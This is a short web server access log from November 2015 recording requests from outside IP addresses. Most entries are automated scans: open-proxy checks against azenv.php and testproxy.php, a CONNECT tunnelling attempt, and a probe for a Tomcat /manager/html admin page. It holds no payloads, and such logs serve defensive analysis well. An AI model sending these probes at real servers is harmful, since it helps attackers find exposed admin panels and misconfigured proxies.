62.210.88.201 - - [06/Nov/2015:05:57:47 +0800] "GET http://51.254.206.142/httptest.php HTTP/1.1" 404 284 "-" "-"
141.212.122.96 - - [06/Nov/2015:07:42:29 +0800] "GET /x HTTP/1.1" 400 172 "-" "Telesphoreo"
95.213.187.187 - - [06/Nov/2015:08:41:46 +0800] "POST http://check.best-proxies.ru/azenv.php?auth=144677050651&a=PSCN&i=2032847673&p=80 HTTP/1.1" 404 284 "http://best-proxies.ru/" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
121.42.0.35 - - [06/Nov/2015:08:53:30 +0800] "GET / HTTP/1.0" 200 6786 "-" "spiderman"
183.60.48.25 - - [06/Nov/2015:09:46:49 +0800] "GET http://www.baidu.com/ HTTP/1.1" 200 6786 "-" "-"
154.87.1.102 - - [06/Nov/2015:10:14:01 +0800] "GET / HTTP/1.1" 200 6786 "-" "-"
121.42.0.35 - - [06/Nov/2015:10:32:31 +0800] "GET / HTTP/1.0" 200 6786 "-" "spiderman"
182.118.53.214 - - [06/Nov/2015:11:34:44 +0800] "GET / HTTP/1.1" 200 6786 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36"
61.160.213.110 - - [06/Nov/2015:12:58:31 +0800] "GET http://zc.qq.com/chs/index.html?type=1 HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)"
182.118.60.19 - - [06/Nov/2015:13:01:56 +0800] "GET / HTTP/1.1" 200 6786 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36"
5.178.86.75 - - [06/Nov/2015:13:21:39 +0800] "POST http://check.best-proxies.ru/azenv.php?auth=144678730071&a=PSCN&i=2032847673&p=80 HTTP/1.1" 404 284 "http://best-proxies.ru/" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
193.203.48.27 - - [06/Nov/2015:14:39:20 +0800] "GET / HTTP/1.1" 200 6786 "-" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
183.11.49.65 - - [06/Nov/2015:17:02:30 +0800] "GET /manager/html HTTP/1.1" 404 284 "-" "Mozilla/3.0 (compatible; Indy Library)"
121.42.26.218 - - [06/Nov/2015:17:13:04 +0800] "CONNECT www.google.co.uk:443 HTTP/1.1" 400 172 "-" "-"
183.60.48.25 - - [06/Nov/2015:17:47:27 +0800] "GET http://www.baidu.com/ HTTP/1.1" 200 6786 "-" "-"
95.213.187.187 - - [06/Nov/2015:17:56:34 +0800] "POST http://check.best-proxies.ru/azenv.php?auth=144680379561&a=PSCN&i=2032847673&p=80 HTTP/1.1" 404 284 "http://best-proxies.ru/" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
185.25.151.159 - - [06/Nov/2015:20:26:46 +0800] "GET http://testp4.pospr.waw.pl/testproxy.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
119.57.133.42 - - [06/Nov/2015:21:31:46 +0800] "GET / HTTP/1.1" 200 6786 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.2; .NET4.0C; .NET4.0E)"
95.213.187.188 - - [06/Nov/2015:22:28:49 +0800] "POST http://check.best-proxies.ru/azenv.php?auth=144682013099&a=PSCN&i=2032847673&p=80 HTTP/1.1" 404 284 "http://best-proxies.ru/" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
